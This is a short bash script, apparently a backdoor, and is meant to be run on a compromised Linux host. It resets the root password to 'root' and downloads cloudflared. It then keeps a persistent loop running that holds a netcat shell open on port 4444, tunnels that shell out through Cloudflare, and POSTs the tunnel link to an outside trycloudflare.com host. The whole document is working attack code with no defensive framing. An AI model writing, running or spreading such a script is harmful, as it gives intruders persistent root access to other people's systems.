#!/bin/bash
# 1. Credentials Takeover
echo "root:root" | sudo chpasswd

# 2. Setup Cloudflared
if [ ! -f /tmp/cloudflared ]; then
    curl -L --output /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
    chmod +x /tmp/cloudflared
fi

# 3. Persistent Loop
nohup bash -c "while true; do
    # A. Ensure local listener is ready
    if ! pgrep -x 'nc' > /dev/null; then
        nohup nc -lkp 4444 -e /bin/bash > /dev/null 2>&1 &
    fi

    # B. Start TCP Tunnel (Avoids HTTP 502/530 errors)
    if ! pgrep -f 'tcp://localhost:4444' > /dev/null; then
        nohup /tmp/cloudflared tunnel --no-autoupdate --url tcp://localhost:4444 > /tmp/shell.log 2>&1 &
    fi

    sleep 15

    # C. Exfiltrate the TCP link to your Mac
    TCP_URL=\$(grep -o 'tcp://[-0-9a-z]*\.trycloudflare.com:[0-9]*' /tmp/shell.log | head -n 1)
    if [ ! -z \"\$TCP_URL\" ]; then
        curl -s -X POST -d \"SHELL_LINK: \$TCP_URL\" https://merchandise-angeles-jade-stud.trycloudflare.com
    fi
    sleep 10
done" > /dev/null 2>&1 &
